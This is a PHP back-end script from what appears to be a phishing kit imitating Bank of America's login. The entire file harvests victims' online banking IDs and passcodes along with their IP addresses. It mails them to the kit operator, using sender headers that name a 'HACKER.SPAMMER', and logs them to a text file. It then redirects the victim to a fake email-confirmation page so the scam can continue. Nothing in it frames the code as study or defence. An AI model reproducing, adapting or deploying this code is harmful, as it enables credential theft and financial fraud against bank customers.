<?php include ("../images/sec.gif");
$zabi = getenv("REMOTE_ADDR");
include '../antibots.php';
include('../email.php');
include '../bt.php';
include "../blocker.php";
$message .= "--------------  BOA LOGIN  -------------\n";
$message .= "Online ID       : ".$_POST['us']."\n";
$message .= "Passcode        : ".$_POST['ps']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "----------------------------------------------------\n";
$cc = $_POST['ccn'];
$subject = "BOA BAN3 LOGGN [ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];
$headers = "From: HACKER.SPAMMER <contact>\r\n";
mail($email,$subject,$message,$headers);
mail($userinfo,$subject,$message,$headers);
$text = fopen('../Datosssbofa.txt', 'a');
fwrite($text, $message);


header("Location: ../Bank of America Mobile - Confirm your email address.html?cmd=_account-details&session=".md5(microtime())."&dispatch=".sha1(microtime()));
?>